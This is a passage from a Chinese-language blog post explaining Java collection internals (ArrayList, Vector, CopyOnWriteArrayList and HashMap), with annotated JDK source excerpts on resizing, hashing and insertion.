<p>LinkedList采用链表存储，插入删除速度快，不受元素位置影响，始终为O(1)</p>
</li>
<li><p>LinkedList不支持高效访问数据，ArrayList实现<code>RandomAccess</code>接口(标记接口)，使得其具有高效访问数据的功能，即根据元素下标访问数据</p>
</li>
<li><p>ArrayList对空间的浪费来自于list列表总是会预留一定的空间，而LinkedList体现在它每个元素都要占用更多的空间</p>
</li>
</ol>
<h3 id="RandomAccess"><a href="#RandomAccess" class="headerlink" title="RandomAccess"></a>RandomAccess</h3><p><code>ArrayList</code>继承了一个<code>RandomAccess</code>接口，这个接口在源码中并没有什么定义（相当于一个标识接口），用于标识这个接口的类具有随机访问的功能。<br>在<code>Collections</code>工具类（提供大量针对<code>Collection</code>的操作）的<code>binarySearch()</code>中，它要判断传入的 list 是否<code>RamdomAccess</code>的实例，如果是，调用<code>indexedBinarySearch（）</code>方法，如果不是，那么调用<code>iteratorBinarySearch（）</code>方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">binarySearch</span><span class="params">(List&lt;? extends Comparable&lt;? <span class="keyword">super</span> T&gt;&gt; list, T key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (list <span class="keyword">instanceof</span> RandomAccess || list.size()&lt;BINARYSEARCH_THRESHOLD)</span><br><span class="line">        <span class="keyword">return</span> Collections.indexedBinarySearch(list, key);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> Collections.iteratorBinarySearch(list, key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="list的遍历选择"><a href="#list的遍历选择" class="headerlink" title="list的遍历选择"></a>list的遍历选择</h3><ul>
<li>实现了<code>RandomAccess</code>接口的list（表明支持快速随机访问），优先使用普通for循环，其次使用foreach</li>
<li>未实现<code>RandomAccess</code>接口的list，优先选择<code>iterator</code>遍历（foreach遍历底层也是通过iterator实现的），大size的数据，千万不要使用普通for循环。</li>
</ul>
<h3 id="排序方法"><a href="#排序方法" class="headerlink" title="排序方法"></a>排序方法</h3><ul>
<li>将list放在<code>TreeSet</code>当中进行排序，根据排序顺序放置在list集合当中</li>
<li>list转化为数组，利用数组排序规则进行排序 <code>Arrays.sort()</code></li>
<li>使用集合工具类<code>Collections()</code>的<code>sort()</code>进行排序 <code>Collections.sort()</code>    </li>
</ul>
<h2 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h2><p><img src="https://csn.damyoung.cn/image-20201231172154394.png" alt="image-20201231172154394"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object[] elementData;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> elementCount;</span><br><span class="line"><span class="comment">//扩容容量</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">int</span> capacityIncrement;</span><br></pre></td></tr></table></figure>

<h3 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h3><p>Vector与ArrayList实现差不多相同，但方法内部用Synchronized进行同步</p>
<h3 id="构造-1"><a href="#构造-1" class="headerlink" title="构造"></a>构造</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">int</span> capacityIncrement)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Illegal Capacity: &quot;</span>+</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    <span class="keyword">this</span>.elementData = <span class="keyword">new</span> Object[initialCapacity];</span><br><span class="line">    <span class="keyword">this</span>.capacityIncrement = capacityIncrement;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//给定扩容增长量为0</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//给定初始容量为10</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Vector</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="扩容-1"><a href="#扩容-1" class="headerlink" title="扩容"></a>扩容</h3><p>实现与ArrayList相似，在增长率上不同</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">grow</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// overflow-conscious code</span></span><br><span class="line">    <span class="keyword">int</span> oldCapacity = elementData.length;</span><br><span class="line">    <span class="comment">//capacityIncrement==0时，默认增长为2倍</span></span><br><span class="line">    <span class="comment">//capacityIncrement+oldCapacity</span></span><br><span class="line">    <span class="keyword">int</span> newCapacity = oldCapacity + ((capacityIncrement &gt; <span class="number">0</span>) ?</span><br><span class="line">                                     capacityIncrement : oldCapacity);</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - minCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = minCapacity;</span><br><span class="line">    <span class="keyword">if</span> (newCapacity - MAX_ARRAY_SIZE &gt; <span class="number">0</span>)</span><br><span class="line">        newCapacity = hugeCapacity(minCapacity);</span><br><span class="line">    elementData = Arrays.copyOf(elementData, newCapacity);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">hugeCapacity</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (minCapacity &lt; <span class="number">0</span>) <span class="comment">// overflow</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> OutOfMemoryError();</span><br><span class="line">    <span class="keyword">return</span> (minCapacity &gt; MAX_ARRAY_SIZE) ?</span><br><span class="line">        Integer.MAX_VALUE :</span><br><span class="line">    MAX_ARRAY_SIZE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="与ArrayList区别"><a href="#与ArrayList区别" class="headerlink" title="与ArrayList区别"></a>与ArrayList区别</h3><ol>
<li><code>ArrayList</code>是线程不安全的，而<code>Vector</code>是线程安全的，因此开销比<code>ArrayList</code>大，访问速度较慢。最好使用<code>ArrayList</code>，因为同步操作完全可以由程序员自己来控制。</li>
<li><code>Vector</code>每次扩容是默认容量为原来2倍，而且可以自行指定增长速率，<code>ArrayList</code>为1.5倍。</li>
</ol>
<h3 id="替代方案"><a href="#替代方案" class="headerlink" title="替代方案"></a>替代方案</h3><ol>
<li>可以使用<code>Collections.synchronizedList()</code>得到一个线程安全的<code>ArrayList</code></li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">List&lt;String&gt; synList = Collections.synchronizedList(list);</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>也可以使用<code>concurrent</code>并发包下的<code>CopyOnWriteArrayList</code>类。</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; list = <span class="keyword">new</span> CopyOnWriteArrayList&lt;&gt;();</span><br></pre></td></tr></table></figure>

<h2 id="CopyOnWriteArrayList"><a href="#CopyOnWriteArrayList" class="headerlink" title="CopyOnWriteArrayList"></a>CopyOnWriteArrayList</h2><p><img src="https://csn.damyoung.cn/image-20201231174403760.png" alt="image-20201231174403760"></p>
<p>用于创建一个适合<strong>并发</strong>的<strong>ArrayList</strong>，其主要实现原理是<strong>读写分离</strong></p>
<ul>
<li>写操作在一个复制的数组上进行    <ul>
<li>写操作需要<strong>加锁</strong>，防止并发写入时导致写入数据丢失以及多线程写入copy出多个副本</li>
<li>写操作结束之后需要把原始数组指向新的复制数组</li>
</ul>
</li>
<li>读操作还是在原始数组上进行，读写分离，互不影响</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//可重入锁对象</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">transient</span> ReentrantLock lock = <span class="keyword">new</span> ReentrantLock();</span><br><span class="line"><span class="comment">//volatile修饰保证多线程下的可见性</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">transient</span> <span class="keyword">volatile</span> Object[] array;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> Object[] getArray() &#123;</span><br><span class="line">    <span class="keyword">return</span> array;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//将新的数组指向原数组</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setArray</span><span class="params">(Object[] a)</span> </span>&#123;</span><br><span class="line">    array = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="add-2"><a href="#add-2" class="headerlink" title="add"></a>add</h3><ol>
<li>加锁ReentrantLock</li>
<li>写操作复制到新数组上进行</li>
<li>指向原数组</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> ReentrantLock lock = <span class="keyword">this</span>.lock;</span><br><span class="line">    <span class="comment">//加上可重入锁</span></span><br><span class="line">    lock.lock();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Object[] elements = getArray();</span><br><span class="line">        <span class="keyword">int</span> len = elements.length;</span><br><span class="line">        <span class="comment">//复制一个新写数组</span></span><br><span class="line">        Object[] newElements = Arrays.copyOf(elements, len + <span class="number">1</span>);</span><br><span class="line">        newElements[len] = e;</span><br><span class="line">        <span class="comment">//将新的写数组指向原有的数组</span></span><br><span class="line">        setArray(newElements);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">        lock.unlock();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//新数组指向原有数组</span></span><br><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">setArray</span><span class="params">(Object[] a)</span> </span>&#123;</span><br><span class="line">    array = a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="适用场景"><a href="#适用场景" class="headerlink" title="适用场景"></a>适用场景</h3><p><code>CopyOnWriteArrayList</code>在写操作同时可以进行读操作，适合读多写少的场景</p>
<h3 id="缺陷"><a href="#缺陷" class="headerlink" title="缺陷"></a>缺陷</h3><p>不适合内存敏感以及实时性要求很高的场景</p>
<ul>
<li>内存占用，在写操作时需要复制一个新的数组，使得内存占用为原来的俩倍</li>
<li>数据不一致，读操作不能读取实时性的数据，因为部分写操作此时还未同步到读数组中去</li>
</ul>
<h1 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h1><p>键值对映射容器，key-value形式，key不能重复，一个key只能对应一个值，但不能通过值来获取键</p>
<ul>
<li><p>key:  <code>keySet()</code>    通过Set存储，不能重复,插入和取出的顺序不一致</p>
</li>
<li><p>value：<code>values()</code>   通过Collection存储，值能重复，取出和插入的顺序一致</p>
</li>
<li><p>Map.Entry：无序不可重复，Entry随着key走     </p>
</li>
</ul>
<h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><ol>
<li><p>JDK8之前 HashMap 由数组+链表组成，数组是 HashMap 的主体，链表则是为了解决<strong>hash冲突</strong>而存在的(<strong>拉链法</strong>)</p>
</li>
<li><p>JDK8之后在解决hash冲突上有很大的变化，当链表长度大于阈值(<code>TREEIFY_THRESHOLD</code>)时，将链表转化为红黑树，减少搜索时间。</p>
</li>
</ol>
<p><strong>优点</strong>：转化成红黑树能够提高数据查找效率（类似于二分查找)</p>
<p><strong>为什么不使用二叉树？</strong></p>
<p>答：二叉树在某些特定情况下，会变成一个线性结构，红黑树就是为了防止这种缺陷。</p>
<p>在元素插入时，红黑树要经过左旋、右旋、变色这些操作来保持平衡，在链表元素较少，没必要使用红黑树，使用反而会使得效率更低。</p>
<p>链表长度较长时，维护红黑树的代价远比遍历链表的代价小得多，使用红黑树来提高效率。</p>
<ol start="3">
<li>初始化有俩个必须完成的是 loadFactor,threshold (代表数组的长度阈值)</li>
</ol>
<h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HashMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractMap</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Map</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt;, <span class="title">Cloneable</span>, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//默认初始化桶的容量，16</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_INITIAL_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">4</span>; <span class="comment">// aka 16</span></span><br><span class="line">    <span class="comment">//允许的最大容量</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MAXIMUM_CAPACITY = <span class="number">1</span> &lt;&lt; <span class="number">30</span>;</span><br><span class="line">    <span class="comment">//默认的加载因子</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">float</span> DEFAULT_LOAD_FACTOR = <span class="number">0.75f</span>;</span><br><span class="line">    <span class="comment">//当桶（bucket）上的结点数大于这个值时会转化成红黑树</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> TREEIFY_THRESHOLD = <span class="number">8</span>;</span><br><span class="line">    <span class="comment">//当桶（bucket）上的结点数小于这个值时转化成链表</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UNTREEIFY_THRESHOLD = <span class="number">6</span>;</span><br><span class="line">    <span class="comment">//桶中结构转换成红黑树对应table的最小大小</span></span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> MIN_TREEIFY_CAPACITY = <span class="number">64</span>;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//存储元素的数组，总是2的幂次倍，即桶数组</span></span><br><span class="line"><span class="keyword">transient</span> Node&lt;K,V&gt;[] table;</span><br><span class="line"><span class="comment">//存放具体元素的集合</span></span><br><span class="line"><span class="keyword">transient</span> Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet;</span><br><span class="line"><span class="comment">//存放元素的个数</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> size;</span><br><span class="line"><span class="comment">//每次扩容和更改map的计数器</span></span><br><span class="line"><span class="keyword">transient</span> <span class="keyword">int</span> modCount;</span><br><span class="line"><span class="comment">//临界值，当实际大小（容量*加载因子）超过临界值时，会进行扩容</span></span><br><span class="line"><span class="comment">//在初始化table进行初始化</span></span><br><span class="line"><span class="keyword">int</span> threshold;</span><br><span class="line"><span class="comment">//加载因子,无参构造时要进行初始化</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">float</span> loadFactor;</span><br></pre></td></tr></table></figure>

<ol>
<li>loadFactor：<code>size/capacity</code>加载因子是控制数组存放数据的疏密程度</li>
</ol>
<p><strong>在构造函数时进行初始化</strong></p>
<blockquote>
<p>给定的默认容量为16，默认的加载因子为0.75f。</p>
<p>当数据量达到16*0.75=12时，需要对当前16的容量进行扩容，扩容这个过程涉及到rehash、复制数据等操作，所以非常消耗性能。</p>
</blockquote>
<ol start="2">
<li>threshold：<code>threshold=capacity*loadFactor</code>临界值，当<code>size&gt;=threshold</code>时，就要考虑对数组(桶)的扩容。是衡量数组是否需要扩增的一个标准</li>
</ol>
<p><strong>在初始化table时进行初始化</strong></p>
<ol start="3">
<li><p>size：存放元素的个数，即<code>Set&lt;Map.EntrySet&lt;K,V&gt;&gt;</code>的长度</p>
</li>
<li><p>Node&lt;K,V&gt;[] : 存放元素的数组，Node可以表示链表的第一个元素，采用拉链法来存储元素</p>
</li>
<li><p>capacity：指的是桶的数量，默认桶的数量为16(<code>DEFAULT_INITIAL_CAPACITY</code>)</p>
</li>
</ol>
<h3 id="Node节点和树节点"><a href="#Node节点和树节点" class="headerlink" title="Node节点和树节点"></a>Node节点和树节点</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//将键值对组装成一个结点，用于存放数组集合中(桶)</span></span><br><span class="line"><span class="comment">//通过拉链法来解决hash冲突</span></span><br><span class="line"><span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">implements</span> <span class="title">Map</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    <span class="comment">//hash值，存放元素到hashMap时用来计算桶的位置</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">int</span> hash;</span><br><span class="line">    <span class="keyword">final</span> K key;</span><br><span class="line">    V value;</span><br><span class="line">    <span class="comment">//下一个节点</span></span><br><span class="line">    Node&lt;K,V&gt; next;</span><br><span class="line"></span><br><span class="line">    Node(<span class="keyword">int</span> hash, K key, V value, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">        <span class="keyword">this</span>.hash = hash;</span><br><span class="line">        <span class="keyword">this</span>.key = key;</span><br><span class="line">        <span class="keyword">this</span>.value = value;</span><br><span class="line">        <span class="keyword">this</span>.next = next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> K <span class="title">getKey</span><span class="params">()</span>        </span>&#123; <span class="keyword">return</span> key; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">getValue</span><span class="params">()</span>      </span>&#123; <span class="keyword">return</span> value; &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> key + <span class="string">&quot;=&quot;</span> + value; &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写hashcode方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Objects.hashCode(key) ^ Objects.hashCode(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> V <span class="title">setValue</span><span class="params">(V newValue)</span> </span>&#123;</span><br><span class="line">        V oldValue = value;</span><br><span class="line">        value = newValue;</span><br><span class="line">        <span class="keyword">return</span> oldValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重写equals方法</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">boolean</span> <span class="title">equals</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">if</span> (o <span class="keyword">instanceof</span> Map.Entry) &#123;</span><br><span class="line">            Map.Entry&lt;?,?&gt; e = (Map.Entry&lt;?,?&gt;)o;</span><br><span class="line">            <span class="keyword">if</span> (Objects.equals(key, e.getKey()) &amp;&amp;</span><br><span class="line">                Objects.equals(value, e.getValue()))</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">TreeNode</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; <span class="keyword">extends</span> <span class="title">LinkedHashMap</span>.<span class="title">Entry</span>&lt;<span class="title">K</span>,<span class="title">V</span>&gt; </span>&#123;</span><br><span class="line">    TreeNode&lt;K,V&gt; parent;  <span class="comment">// red-black tree links</span></span><br><span class="line">    TreeNode&lt;K,V&gt; left;</span><br><span class="line">    TreeNode&lt;K,V&gt; right;</span><br><span class="line">    TreeNode&lt;K,V&gt; prev;    <span class="comment">// needed to unlink next upon deletion</span></span><br><span class="line">    <span class="keyword">boolean</span> red;</span><br><span class="line">    TreeNode(<span class="keyword">int</span> hash, K key, V val, Node&lt;K,V&gt; next) &#123;</span><br><span class="line">        <span class="keyword">super</span>(hash, key, val, next);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="hash地址"><a href="#hash地址" class="headerlink" title="hash地址"></a>hash地址</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>HashMap通过计算<strong>key</strong>的hash值，通过扰动函数进行处理得到hash值</li>
</ol>
<p>扰动函数：指的是HashMap的hash方法，使用hash方法也就是扰动函数是为了防止一些实现比较差的<code>hashcode()</code>方法，换句话说使用扰动函数之后可以<strong>减少碰撞</strong>。</p>
<p>key的hashcode是一个32位的int值，将hashcode的高16和低16进行异或操作。</p>
<ol start="2">
<li>再通过<code>(n-1) &amp; hash</code>判断元素存放的位置（n指的是数组的长度）</li>
</ol>
<ul>
<li>存放的位置不存在元素，直接放入</li>
<li>存放的位置存在元素，判断该元素与要存入的元素key值是否相同<ul>
<li>相同则直接覆盖</li>
<li>不同则通过拉链法解决冲突</li>
</ul>
</li>
</ul>
<h3 id="构造方法"><a href="#构造方法" class="headerlink" title="构造方法"></a>构造方法</h3><blockquote>
<p>默认的构造方法对<code>loadFactor</code>进行初始化</p>
</blockquote>
<ul>
<li>！！！传入<code>initialCapacity</code>，要取大于该数的2的最小次幂，目的hash计算桶位置时，是通过(length-1) &amp; hash来计算的，这样数组长度-1正好相当于一个”低位掩码”，结果就是散列值高位为0，只保留低位值作为桶坐标</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//默认的构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR; <span class="comment">// all other fields defaulted</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//指定初始容量和加载因子的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Illegal initial capacity: &quot;</span> +</span><br><span class="line">                                           initialCapacity);</span><br><span class="line">    <span class="keyword">if</span> (initialCapacity &gt; MAXIMUM_CAPACITY)</span><br><span class="line">        initialCapacity = MAXIMUM_CAPACITY;</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                           loadFactor);</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = loadFactor;</span><br><span class="line">    <span class="keyword">this</span>.threshold = tableSizeFor(initialCapacity);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//指定初始容量的构造函数</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(<span class="keyword">int</span> initialCapacity)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>(initialCapacity, DEFAULT_LOAD_FACTOR);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//包含一个Map的构造方法</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">HashMap</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.loadFactor = DEFAULT_LOAD_FACTOR;</span><br><span class="line">    putMapEntries(m, <span class="keyword">false</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="putMapEntries"><a href="#putMapEntries" class="headerlink" title="putMapEntries"></a>putMapEntries</h3><blockquote>
<p>用于将一个Map集合放入HashMap中</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">void</span> <span class="title">putMapEntries</span><span class="params">(Map&lt;? extends K, ? extends V&gt; m, <span class="keyword">boolean</span> evict)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> s = m.size();</span><br><span class="line">    <span class="keyword">if</span> (s &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//table未初始化，要对threshold阈值进行初始化</span></span><br><span class="line">        <span class="keyword">if</span> (table == <span class="keyword">null</span>) &#123; <span class="comment">// pre-size</span></span><br><span class="line">            <span class="comment">//设置初始化容量为当前HashMap的size除以加载因子+1</span></span><br><span class="line">            <span class="keyword">float</span> ft = ((<span class="keyword">float</span>)s / loadFactor) + <span class="number">1.0F</span>;</span><br><span class="line">            <span class="comment">//判断ft是否超出最大容量</span></span><br><span class="line">            <span class="keyword">int</span> t = ((ft &lt; (<span class="keyword">float</span>)MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : MAXIMUM_CAPACITY);</span><br><span class="line">            <span class="comment">//初始化阈值</span></span><br><span class="line">            <span class="keyword">if</span> (t &gt; threshold)</span><br><span class="line">                threshold = tableSizeFor(t);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//如果table已经初始化，且m的个数大于阈值，则进行扩容</span></span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (s &gt; threshold)</span><br><span class="line">            resize();</span><br><span class="line">        <span class="comment">//将m集合中entries放入到HashMap中</span></span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;? extends K, ? extends V&gt; e : m.entrySet()) &#123;</span><br><span class="line">            K key = e.getKey();</span><br><span class="line">            V value = e.getValue();</span><br><span class="line">            <span class="comment">//通过hash计算来判断并put元素</span></span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, evict);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>首先要判断当前HashMap的桶是否已经初始化</li>
</ol>
<ul>
<li>table未初始化，要对table的阈值进行初始化</li>
<li>已经初始化，判断是否容量不足(大于阈值)，则进行扩容</li>
</ul>
<ol start="2">
<li>遍历并通过计算hash值来插入集合元素</li>
</ol>
<h3 id="put"><a href="#put" class="headerlink" title="put"></a>put</h3><blockquote>
<p>HashMap只提供put用于添加元素，<code>putVal</code>只是用来给put方法调用的一个方法，并没有提供给用户使用</p>
</blockquote>
<p><strong>步骤：</strong></p>
<ol>
<li>判断当前table未初始化或长度为0，要对其进行扩容</li>
<li>如果定位(通过计算hash值)到数组位置没有元素则直接插入</li>
<li>如果存在有元素则要与要插入的key比较，同时分为树节点/链表节点进行判断<ul>
<li>key相同直接覆盖</li>
<li>key不同，就判断是否是树节点，如果是调用<code>e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</code>将元素添加进去。如果不是就遍历链表插入(插入的是链表尾部)</li>
<li>同时应该对链表/树节点进行判断key相同的情况</li>
</ul>
</li>
<li>若找到相同的节点，停止插入操作，根据传入参数来判断是否进行旧值覆盖</li>
</ol>
<img src="https://camo.githubusercontent.com/df1c3077b929873727c9970e3a48c0ef14fd094d/68747470733a2f2f6d792d626c6f672d746f2d7573652e6f73732d636e2d6265696a696e672e616c6979756e63732e636f6d2f323031392d372f7075742545362539362542392545362542332539352e706e67" alt="插入数据流程图" style="zoom:67%;" />

